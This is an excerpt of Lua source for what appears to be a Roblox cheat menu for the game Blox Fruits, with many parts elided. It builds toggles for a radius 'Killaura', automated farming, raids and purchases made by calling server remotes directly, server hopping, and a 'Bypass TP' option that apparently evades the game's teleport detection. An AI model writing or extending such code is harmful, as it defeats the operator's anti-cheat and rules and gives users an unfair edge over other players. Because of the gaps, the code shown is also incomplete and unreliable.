            autoBuyChalice = Sea3ItemsSection:NewToggle("Auto Buy Sweet Chalice", function(value)
                getgenv().tamshitSettings["Auto Buy Sweet Chalice"] = value
                _G.AutoBuySweetChalice = value
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Buy Sweet Chalice"] then autoBuyChalice:UpdateToggle(nil, true) end
            ...
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["AutoCDK"] then
                            AutoCDK = true
                        else
                            AutoCDK = false
                        end
        ...
        Killaura = RaidSection:NewToggle("Killaura [ONLY WHILE RAID]", function(state)
            getgenv().tamshitSettings["killaura"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["killaura"] then Killaura:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["killaura"] and not BlockRaids then
                            ...
                            for i,v in pairs(game.Workspace.Enemies:GetDescendants()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and LP.Character:FindFirstChild("HumanoidRootPart") and (LP.Character.HumanoidRootPart.CFrame.Position - v.HumanoidRootPart.CFrame.Position).Magnitude < KillauraRadius then
                                    pcall(function()
                                        ...
                                        until not getgenv().tamshitSettings["killaura"] or not v.Parent or v.Humanoid.Health <= 0 or not LP.Character:FindFirstChild("HumanoidRootPart") or (LP.Character.HumanoidRootPart.CFrame.Position - v.HumanoidRootPart.CFrame.Position).Magnitude > KillauraRadius
                                    end)
                                end
                            end
                        end
        ...
        autonextisland = RaidSection:NewToggle("Auto Next Island [ONLY WHILE RAID]", function(state)
            getgenv().tamshitSettings["autonextisland"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["autonextisland"] and not BlockRaids then autonextisland:UpdateToggle(nil, true) end
        ...
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["autonextisland"] then
                        islands = {"Island 5", "Island 4", "Island 3", "Island 2", "Island 1"}
                        if LP.PlayerGui.Main.Timer.Visible == true then
                            NoClip = true
                            found = false
        ...
        autostartraid = RaidSection:NewToggle("Auto Start Raid", function(state)
            getgenv().tamshitSettings["autostartraid"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["autostartraid"] then autostartraid:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["autostartraid"] and not BlockRaids then
                        curFrag = LP.Data.Fragments.Value
                        if LP.PlayerGui.Main.Timer.Visible or isIslandNearest() then curFrag = curFrag + 1000 end
                        if not getgenv().tamshitSettings["enabledmaxfrag"] or curFrag < getgenv().tamshitSettings["maxfrag"] then
        ...
        autobuychip = RaidSection:NewToggle("Auto Buy Chip", function(state)
            getgenv().tamshitSettings["autobuychip"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["autobuychip"] then autobuychip:UpdateToggle(nil, true) end
        FakeFruit = false
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["autobuychip"] and not BlockRaids and not LP.PlayerGui.Main.Timer.Visible and not isIslandNearest() then
                        if isItemInEquip("Special Microchip") then curFrag = curFrag + 1000 end
                        if LP.PlayerGui.Main.Timer.Visible or isIslandNearest() then curFrag = curFrag + 1000 end
                        if not getgenv().tamshitSettings["enabledmaxfrag"] or curFrag < getgenv().tamshitSettings["maxfrag"] then
                            task.wait(2)
                            if getgenv().tamshitSettings["autobuychip"] then
        ...
        autotradejunk = RaidSection:NewToggle("Auto Trade Fruit < 1M", function(state)
            getgenv().tamshitSettings["autotradejunk"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["autotradejunk"] then autotradejunk:UpdateToggle(nil, true) end
        ...
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    task.wait(4)
                    if getgenv().tamshitSettings["autotradejunk"] and not BlockRaids and getgenv().tamshitSettings["autobuychip"] and not isFruitsInInventory() then
        ...
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    task.wait(5)
                    if getgenv().tamshitSettings["autotradejunk"] and not BlockRaids then
                        if isItemInEquip("Special Microchip") then curFrag = curFrag + 1000 end
                        if LP.PlayerGui.Main.Timer.Visible or isIslandNearest() then curFrag = curFrag + 1000 end
                        if not getgenv().tamshitSettings["enabledmaxfrag"] or curFrag < getgenv().tamshitSettings["maxfrag"] then
        ...
        AutoFarmFruitsForRaidToggle = RaidSection:NewToggle("Farm Fruits For Raid [ Experimental ]", function(state)
            getgenv().tamshitSettings["Auto Farm Fruits For Raid"] = state
            WriteSettings()
            AutoFarmFruitsForRaid = state
        end)
        if getgenv().tamshitSettings["Auto Farm Fruits For Raid"] then AutoFarmFruitsForRaidToggle:UpdateToggle(nil, true) end
        ...
        spawn(function()
            while wait() do
                local s,e = pcall(function()
                    if AutoFarmFruitsForRaid and getgenv().tamshitSettings["autobuychip"] then
        ...
        autoawakefruit = RaidSection:NewToggle("Auto Awake Fruit", function(state)
            getgenv().tamshitSettings["autoawakefruit"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["autoawakefruit"] then autoawakefruit:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do 
                pcall(function()
                    task.wait(1)
                    if getgenv().tamshitSettings["autoawakefruit"] then
        ...
        MaxFragmentSlider = RaidSection:NewSlider("Max FRAG", 0, 20000, function(s)
            getgenv().tamshitSettings["maxfrag"] = s
            WriteSettings()
        end)
        if getgenv().tamshitSettings["maxfrag"] then
            MaxFragmentSlider:UpdateValue(getgenv().tamshitSettings["maxfrag"])
        end
        MaxFragmentToggle = RaidSection:NewToggle("Enable Max Fragments", function(state)
            getgenv().tamshitSettings["enabledmaxfrag"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["enabledmaxfrag"] then MaxFragmentToggle:UpdateToggle(nil, true) end
        ...
        ChipDropdown = RaidSection:NewDropdown("Selected Chip", {"Flame","Ice","Dough","Buddha","Magma","Quake","Light","Dark","Spider","Rumble","Sand","Phoenix"}, function(chip)
            SelectedChip = chip
            getgenv().tamshitSettings["Selected Chip"] = chip
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Selected Chip"] then
            ChipDropdown:UpdateSelect(getgenv().tamshitSettings["Selected Chip"])
        end
        ...
        TeammateCountSlider = RaidSection:NewSlider("Teammates count", 1,3, function(count)
            getgenv().tamshitSettings["Teammates count raid"] = count
            WriteSettings()
            TeammateCount = count
        end)
        if getgenv().tamshitSettings["Teammates count raid"] then TeammateCountSlider:UpdateValue(getgenv().tamshitSettings["Teammates count raid"]) end
        AutoStartWithTeammatesToggle = RaidSection:NewToggle("Auto Start With Teammates", function(state)
            getgenv().tamshitSettings["Auto Start With Teammates"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Auto Start With Teammates"] then AutoStartWithTeammatesToggle:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Auto Start With Teammates"] then
        ...
        RaidTeammateCellDropdown = RaidSection:NewDropdown("Teammate Cell", {"1","2","3"}, function(choice)
            getgenv().tamshitSettings["Raid Teammate Cell"] = choice
            WriteSettings()
            RaidTeammateCell = choice
        end)
        if getgenv().tamshitSettings["Raid Teammate Cell"] then RaidTeammateCellDropdown:UpdateSelect(getgenv().tamshitSettings["Raid Teammate Cell"]) end
        AutoTweenToTeammateCellToggle = RaidSection:NewToggle("Auto Tween to Teammate Cell", function(state)
            getgenv().tamshitSettings["Auto Tween To Mate Cell"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Auto Tween To Mate Cell"] then AutoTweenToTeammateCellToggle:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Auto Tween To Mate Cell"] then
        ...
        if second_sea then
            ...
            AutoSeaBeastToggle = Sea2EventSection:NewToggle("Auto Sea Beast", function(state)
                getgenv().tamshitSettings["Auto Sea Beast"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Sea Beast"] then AutoSeaBeastToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if second_sea and getgenv().tamshitSettings["Auto Sea Beast"] then
                            AutoSeaBeast = true
                        else
                            AutoSeaBeast = false
                        end
        ...
        if third_sea then 
            ...
            AutoLockMoon = MirageSection:NewToggle("Auto Lock Moon", function(state)
                getgenv().tamshitSettings["Auto Lock Moon"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Lock Moon"] then AutoLockMoon:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Lock Moon"] and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then _G.AutoLockMoon = true else _G.AutoLockMoon = false end
                    end)
                end
            end)
            ...
            TweenToMirage = MirageSection:NewToggle("Tween to Mirage [ if exists ]", function(state)
                getgenv().tamshitSettings["Tween to mirage"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Tween to mirage"] then TweenToMirage:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Tween to mirage"] and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then _G.TweenToMirage = true else _G.TweenToMirage = false end
                    end)
                end
            end)
            spawn(function()
            ...
            TweenToGear = MirageSection:NewToggle("Tween to Gear", function(state)
                getgenv().tamshitSettings["Tween to Gear"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Tween to Gear"] then TweenToGear:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Tween to Gear"] and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then _G.TweenToGear = true else _G.TweenToGear = false end
                    end)
                end
            end)
            spawn(function()
            ...
            AutoGearBoat = MirageSection:NewToggle("Auto Blue Gear [ Spawn Mirage ]", function(state)
                getgenv().tamshitSettings["Auto Gear Boat"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Gear Boat"] then AutoGearBoat:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Gear Boat"] then 
            ...
            spawn(function()
                while wait() do
                    ...
                    pcall(function()
                        ...
                        if getgenv().tamshitSettings["Auto Gear Boat"] and tonumber(PlayerData.V4Status) ~= 4 and GetMaterial("Mirror Fractal") > 0 and isAccessoryInInventory("Valkyrie Helm") then
            ...
            AutoGear = MirageSection:NewToggle("Auto Blue Gear [ Default ]", function(state)
                getgenv().tamshitSettings["Auto Gear"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Gear"] then AutoGear:UpdateToggle(nil, true) end
            AutoHopIfNoMirage = MirageSection:NewToggle("Auto Hop If No Mirage", function(state)
                getgenv().tamshitSettings["Auto Hop If No Mirage"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Hop If No Mirage"] then AutoHopIfNoMirage:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Hop If No Mirage"] then 
            ...
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Gear"] then 
                            _G.AutoGear = true 
                        else 
                            _G.AutoGear = false 
                        end
            ...
            spawn(function()
                while wait() do
                    ...
                    pcall(function()
                        ...
                        if getgenv().tamshitSettings["Auto Gear"] and tonumber(PlayerData.V4Status) ~= 4 and GetMaterial("Mirror Fractal") > 0 and isAccessoryInInventory("Valkyrie Helm") then
                            if tonumber(PlayerData.V4Status) == 1 then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Begin")
                                return
                            end
            ...
            AutoFindKitsuneIslandToggle = KitsuneIslandSection:NewToggle("Auto Find Kitsune Island", function(state)
                getgenv().tamshitSettings["Auto Find Kitsune Island"] = state
                stopBoat()
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Find Kitsune Island"] then AutoFindKitsuneIslandToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Find Kitsune Island"] then 
            ...
            AutoCollectAzureEmberToggle = KitsuneIslandSection:NewToggle("Auto Collect Azure Ember", function(state)
                getgenv().tamshitSettings["Auto Collect Azure Ember"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Collect Azure Ember"] then AutoCollectAzureEmberToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Collect Azure Ember"] then 
            ...
            AutoTradeAzureEmberToggle = KitsuneIslandSection:NewToggle("Auto Trade Azure Ember > 20", function(state)
                getgenv().tamshitSettings["Auto Trade Azure Ember"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Trade Azure Ember"] then AutoTradeAzureEmberToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Trade Azure Ember"] then 
            ...
            AutoSharkAnchor = SeaEventItems:NewToggle("Auto Shark Anchor", function(state)
                getgenv().tamshitSettings["Auto Shark Anchor"] = state
                stopBoat()
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Shark Anchor"] then AutoSharkAnchor:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and getgenv().tamshitSettings["Auto Shark Anchor"] then
            ...
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoSharkAnchor or getgenv().tamshitSettings["Remove Fog"] then
            ...
            AutoFindFrozenDimensionToggle = LeviathanFarm:NewToggle("Auto Find Frozen Dimension", function(state)
                getgenv().tamshitSettings["Auto Find Frozen Dimension"] = state
                stopBoat()
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Find Frozen Dimension"] then AutoFindFrozenDimensionToggle:UpdateToggle(nil, true) end
            dimensionWebhookSended = false
            lockFindFrozenDimension = false
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and getgenv().tamshitSettings["Auto Find Frozen Dimension"] then
            ...
            AutoBribeToggle = LeviathanFarm:NewToggle("Auto Bribe", function(state)
                getgenv().tamshitSettings["Auto Bribe"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Bribe"] then AutoBribeToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and getgenv().tamshitSettings["Auto Bribe"] and BribeLevel < 5 then
            ...
            FollowPlayerBoatToggle = LeviathanFarm:NewToggle("Follow Player Boat", function(state)
                getgenv().tamshitSettings["Follow Player Boat"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Follow Player Boat"] then FollowPlayerBoatToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if third_sea and getgenv().tamshitSettings["Follow Player Boat"] then
            ...
            SelectPlayerDropdown = LeviathanFarm:NewDropdown("Select Player", players, function(choice)
                getgenv().tamshitSettings["Select Player Boat"] = choice
                PlayerBoatName = choice
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Select Player Boat"] then 
                SelectPlayerDropdown:UpdateSelect(getgenv().tamshitSettings["Select Player Boat"]) 
                PlayerBoatName = getgenv().tamshitSettings["Select Player Boat"]
            end
        ...
        if second_sea then
            ...
            AutoV2Race = RaceSection:NewToggle("Auto Race V2", function(state)
                getgenv().tamshitSettings["Auto Race V2"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Race V2"] then AutoV2Race:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Race V2"] then _G.AutoV2Race = true else _G.AutoV2Race = false end
                    end)
                end
            end)
            spawn(function()
            ...
            AutoV3RaceToggle = RaceSection:NewToggle("Auto Race V3", function(state)
                getgenv().tamshitSettings["Auto Race V3"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Race V3"] then AutoV3RaceToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().tamshitSettings["Auto Race V3"] and PlayerData.RaceVer == "V2" then AutoV3Race = true else AutoV3Race = false end
                    end)
                end
            end)
        ...
        if third_sea then
            ...
            AutoTrial = RaceV4Section:NewToggle("Auto Trial", function(state)
                getgenv().tamshitSettings["Auto Trial"] = state
                WriteSettings()
            end)
            spawn(function()
                pcall(function()
                    while wait() do
                        if getgenv().tamshitSettings["Auto Trial"] then _G.AutoTrial = true else _G.AutoTrial = false end
                    end
                end)
            end)
            if getgenv().tamshitSettings["Auto Trial"] then AutoTrial:UpdateToggle(nil, true) end
            ...
            AutoStartTrial = RaceV4Section:NewToggle("Auto Start Trial [not working]", function(state)
                getgenv().tamshitSettings["Auto Start Trial"] = state
                WriteSettings()
            end)
            spawn(function()
                pcall(function()
                    while wait() do
                        if getgenv().tamshitSettings["Auto Start Trial"] then _G.AutoStartTrial = true else _G.AutoStartTrial = false end
                    end
                end)
            end)
            if getgenv().tamshitSettings["Auto Start Trial"] then AutoStartTrial:UpdateToggle(nil, true) end
            spawn(function()
                pcall(function()
                    while wait() do
            ...
            SuicideTrial = RaceV4Section:NewToggle("Suicide After Complete Trial [not working]", function(state)
                getgenv().tamshitSettings["Suicide After Complete Trial"] = state
                WriteSettings()
            end)
            spawn(function()
                pcall(function()
                    while wait() do
                        if getgenv().tamshitSettings["Suicide After Complete Trial"] then _G.SuicideAfterTrial = true else _G.SuicideAfterTrial = false end
                    end
                end)
            end)
            if getgenv().tamshitSettings["Suicide After Complete Trial"] then SuicideTrial:UpdateToggle(nil, true) end
            spawn(function()
                pcall(function()
                    while wait() do
            ...
            AncientOne = RaceV4Section:NewToggle("Auto Buy", function(state)
                getgenv().tamshitSettings["Auto Buy Ancient One Quest"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Auto Buy Ancient One Quest"] then AncientOne:UpdateToggle(nil, true) end
            spawn(function()
                pcall(function()
                    while wait(5) do
                        if getgenv().tamshitSettings["Auto Buy Ancient One Quest"] then 
                            ReplicatedStorage.Remotes.CommF_:InvokeServer('UpgradeRace','Buy')
                        end
                    end
                end)
            ...
            SpamAWK = RaceV4Section:NewToggle("Spam Awakening Skill", function(state)
                getgenv().tamshitSettings["Spam AWK"] = state
                WriteSettings()
            end)
            if getgenv().tamshitSettings["Spam AWK"] then SpamAWK:UpdateToggle(nil, true) end
            spawn(function()
                pcall(function()
                    while wait() do
                        if getgenv().tamshitSettings["Spam AWK"] then 
        ...
        SmartPercentKill = MasterySection:NewToggle("Smart Kill At %", function(state)
            getgenv().tamshitSettings['Smart Kill At %'] = state
        end)
        if getgenv().tamshitSettings['Smart Kill At %'] then SmartPercentKill:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings['Smart Kill At %'] then
        ...
        FarmWeaponMastery = MasterySection:NewToggle("Auto Farm Mastery Selected Weapon [Best Way]", function(state)
            getgenv().tamshitSettings['Farm Mastery Best Way Selected Weapon'] = state
        end)
        if getgenv().tamshitSettings['Farm Mastery Best Way Selected Weapon'] then FarmWeaponMastery:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings['Farm Mastery Best Way Selected Weapon'] then
                        _G.FarmWeaponMastery = true
                    else
        ...
        FarmFruitMastery = MasterySection:NewToggle("Auto Farm Mastery Fruit [Best Way]", function(state)
            getgenv().tamshitSettings['Farm Mastery Best Way'] = state
        end)
        if getgenv().tamshitSettings['Farm Mastery Best Way'] then FarmFruitMastery:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings['Farm Mastery Best Way'] then
        ...
        FarmGunMastery = MasterySection:NewToggle("Auto Farm Gun Mastery [Best Way]", function(state)
            getgenv().tamshitSettings['Farm Mastery Best Way Gun'] = state
        end)
        if getgenv().tamshitSettings['Farm Mastery Best Way Gun'] then FarmGunMastery:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings['Farm Mastery Best Way Gun'] then
        ...
        if third_sea then
            ...
            AutoBoneRandom = BonesShopSection:NewToggle("Auto Random Surprise", function(state)
                getgenv().tamshitSettings["Auto Random Surprise"] = state
                WriteSettings()
            end)
            spawn(function() 
                while wait() do
                    if getgenv().tamshitSettings["Auto Random Surprise"] and third_sea then
                        pcall(function()
            ...
            if getgenv().tamshitSettings["Auto Random Surprise"] then AutoBoneRandom:UpdateToggle(nil, true) end 
        end
        if second_sea then
            ...
            AutoFindSwordDealerToggle = SwordShopSection:NewToggle("Auto Find Sword Dealer", function(state)
                getgenv().tamshitSettings["Auto Find Sword Dealer"] = state
                WriteSettings()
                AutoFindSwordDealer = state
            end)
            if getgenv().tamshitSettings["Auto Find Sword Dealer"] then AutoFindSwordDealerToggle:UpdateToggle(nil, true) end 
            ...
            AutoBuySword = SwordShopSection:NewToggle("Auto Buy Legendary Sword", function(state)
                getgenv().tamshitSettings["Auto Buy Legendary Sword"] = state
                WriteSettings()
            end)
            webhookSended = false
            spawn(function() 
                while wait(2) do
                    if getgenv().tamshitSettings["Auto Buy Legendary Sword"] and second_sea and LP.Data.Beli.Value >= 2000000 then
                        pcall(function()
            ...
            if getgenv().tamshitSettings["Auto Buy Legendary Sword"] then AutoBuySword:UpdateToggle(nil, true) end 
            AutoHopSword = SwordShopSection:NewToggle("Hop If No Legendary Sword", function(state)
                getgenv().tamshitSettings["Hop If No Legendary Sword"] = state
                WriteSettings()
            end)
            spawn(function() 
                while wait(10) do
                    if getgenv().tamshitSettings["Hop If No Legendary Sword"] and second_sea and LP.Data.Beli.Value >= 2000000 and getgenv().tamshitSettings["Auto Buy Legendary Sword"] and not (isWeaponInInventory("Wando") and isWeaponInInventory("Saddi") and isWeaponInInventory("Shisui")) then
                        pcall(function()
            ...
            if getgenv().tamshitSettings["Hop If No Legendary Sword"] then AutoHopSword:UpdateToggle(nil, true) end 
        ...
        AutoFindLegendaryColorToggle = ColorSection:NewToggle("Auto Find Legendary Color", function(state)
            getgenv().tamshitSettings["Auto Find Legendary Color"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Auto Find Legendary Color"] then AutoFindLegendaryColorToggle:UpdateToggle(nil, true) end 
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Auto Find Legendary Color"] then
        ...
        AutoBuyRndFruit = FruitSection:NewToggle("Auto Buy Random Fruit", function(state)
            getgenv().tamshitSettings["Auto Buy Random Fruit"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Auto Buy Random Fruit"] then AutoBuyRndFruit:UpdateToggle(nil, true) end 
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Auto Buy Random Fruit"] then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("Cousin" , "Buy")
                        wait(100)
                    end
                end)
        ...
        SelectedFruitFromStock = FruitSection:NewDropdown("Fruit for Auto Buy", {"Portal","Buddha","Venom","Dough","Leopard","Kitsune"},function(choice)
            getgenv().tamshitSettings["Fruit for Auto Buy"] = choice
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Fruit for Auto Buy"] then SelectedFruitFromStock:UpdateSelect(getgenv().tamshitSettings["Fruit for Auto Buy"]) end 
        AutoBuyFromStockFruit = FruitSection:NewToggle("Auto Buy Fruit from stock", function(state)
            getgenv().tamshitSettings["Auto Buy Fruit from stock"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Auto Buy Fruit from stock"] then AutoBuyFromStockFruit:UpdateToggle(nil, true) end 
        spawn(function()
            while wait() do
                pcall(function()

                    if getgenv().tamshitSettings["Fruit for Auto Buy"] then
                        if LP.Data.DevilFruit.Value ~= getgenv().tamshitSettings["Fruit for Auto Buy"] .. '-' .. getgenv().tamshitSettings["Fruit for Auto Buy"] then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseRawFruit", getgenv().tamshitSettings["Fruit for Auto Buy"] .. '-' .. getgenv().tamshitSettings["Fruit for Auto Buy"],false)
                        end
                    end
                end)
            end
        ...
        AutoStoreFruit = FruitSection:NewToggle("Auto Store Fruit", function(state)
            getgenv().tamshitSettings["Auto Store Fruit"] = state
            WriteSettings()
            _G.AutoStoreFruit = state
        end)
        if getgenv().tamshitSettings["Auto Store Fruit"] then AutoStoreFruit:UpdateToggle(nil, true) end 
        AutoFarmFruitsBypass = FruitSection:NewToggle("Auto Farm Fruits [Bypass TP]", function(state)
            getgenv().tamshitSettings["Auto Farm Fruits Bypass TP"] = state
            WriteSettings()
            _G.AutoFarmFruitsBypass = state
            _G.ActivateBypassDefense = state
        end)
        if getgenv().tamshitSettings["Auto Farm Fruits Bypass TP"] then AutoFarmFruitsBypass:UpdateToggle(nil, true) end 
        AutoFarmFruitsSafe = FruitSection:NewToggle("Auto Farm Fruits [ SAFE ]", function(state)
            getgenv().tamshitSettings["Auto Farm Fruits Safe"] = state
            WriteSettings()
            _G.AutoFarmFruitsSafe = state
        end)
        if getgenv().tamshitSettings["Auto Farm Fruits Safe"] then AutoFarmFruitsSafe:UpdateToggle(nil, true) end 
        HopWhenNoFruits = FruitSection:NewToggle("Hop When No Fruits On Server", function(state)
            getgenv().tamshitSettings["Hop When No Fruits On Server"] = state
            WriteSettings()
            _G.HopWhenNoFruits = state
        end)
        if getgenv().tamshitSettings["Hop When No Fruits On Server"] then HopWhenNoFruits:UpdateToggle(nil, true) end 
        IgnoreFruitsForHop = FruitSection:NewToggle("Ignore Fruits in Hands for Hop", function(state)
            getgenv().tamshitSettings["Ignore Fruits in Hands for Hop"] = state
            WriteSettings()
            _G.IgnoreFruitsForHop = state
        end)
        if getgenv().tamshitSettings["Ignore Fruits in Hands for Hop"] then IgnoreFruitsForHop:UpdateToggle(nil, true) end 
        ...
        getgenv().tamshitSettings["Distance X"] = 0
        getgenv().tamshitSettings["Distance Y"] = 30
        getgenv().tamshitSettings["Distance Z"] = 0
        ...
        MiscSection:NewDropdown("Auto Join Team", {"Pirate", "Marine"}, function(choice)
            getgenv().tamshitSettings["Team"] = choice
            WriteSettings()
        end)
        MiscSection:NewLabel(" ")
        spamV3 = MiscSection:NewToggle("Auto Use V3 Skill", function(state)
            getgenv().tamshitSettings["Auto Use V3 Skill"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Auto Use V3 Skill"] then spamV3:UpdateToggle(nil, true) end
        spamV4 = MiscSection:NewToggle("Auto Use V4 Skill", function(state)
            getgenv().tamshitSettings["Auto Use V4 Skill"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Auto Use V4 Skill"] then spamV4:UpdateToggle(nil, true) end

        spawn(function()
            while wait(1) do
                pcall(function()
                    if getgenv().tamshitSettings["Auto Use V3 Skill"] then
                        game:service('VirtualInputManager'):SendKeyEvent(true, "T", false, game)
                        game:service('VirtualInputManager'):SendKeyEvent(false, "T", false, game)
                    end
                    if getgenv().tamshitSettings["Auto Use V4 Skill"] then
                        game:service('VirtualInputManager'):SendKeyEvent(true, "Y", false, game)
                        game:service('VirtualInputManager'):SendKeyEvent(false, "Y", false, game)
                    end
                end)
        ...
        DistanceXSlider = MiscSection:NewSlider("Distance X", -30, 30, function(count)
            getgenv().tamshitSettings["Distance X"] = count
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Distance X"] then
            DistanceXSlider:UpdateValue(getgenv().tamshitSettings["Distance X"])
        else
            DistanceXSlider:UpdateValue(10)
        end
        DistanceYSlider = MiscSection:NewSlider("Distance Y", -30, 30, function(count)
            getgenv().tamshitSettings["Distance Y"] = count
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Distance Y"] then
            DistanceYSlider:UpdateValue(getgenv().tamshitSettings["Distance Y"])
        else
            DistanceYSlider:UpdateValue(30)
        end
        DistanceZSlider = MiscSection:NewSlider("Distance Z", -30, 30, function(count)
            getgenv().tamshitSettings["Distance Z"] = count
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Distance Z"] then
            DistanceZSlider:UpdateValue(getgenv().tamshitSettings["Distance Z"])
        else
            DistanceZSlider:UpdateValue(10)
        end
        rd = MiscSection:NewToggle("Random Distance", function(state)
            getgenv().tamshitSettings["Random Distance"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Random Distance"] then rd:UpdateToggle(nil, true) end

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().tamshitSettings["Random Distance"] then
                        getgenv().tamshitSettings["Distance X"] = math.random(-30,30)
                        if math.random(0,1) == 1 then
                            getgenv().tamshitSettings["Distance Y"] = math.random(20,35)
                        else
                            getgenv().tamshitSettings["Distance Y"] = math.random(-15,-23)
                        end
                        getgenv().tamshitSettings["Distance Z"] = math.random(-30,30)
                    end
                    task.wait(.1)
                end)
            end
        ...
        function OffsetCFrame()
            return CFrame.new(getgenv().tamshitSettings["Distance X"],getgenv().tamshitSettings["Distance Y"],getgenv().tamshitSettings["Distance Z"])
        end
        ...
        TweenSpeedSlider = MiscSection:NewSlider("Tween Speed", 1, 600, function(count)
            _G.TweenSpeed = count
            getgenv().tamshitSettings["Tween Speed"] = count
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Tween Speed"] then
            TweenSpeedSlider:UpdateValue(getgenv().tamshitSettings["Tween Speed"])
        else
            TweenSpeedSlider:UpdateValue(350)
        end

        if getgenv().tamshitSettings["Remove Fog"] == nil then
            getgenv().tamshitSettings["Remove Fog"] = true
        end
         
        removefog = MiscSection:NewToggle("Remove Fog", function(state)
            getgenv().tamshitSettings["Remove Fog"] = state
            WriteSettings()
        end)
        if getgenv().tamshitSettings["Remove Fog"] then removefog:UpdateToggle(nil, true) end

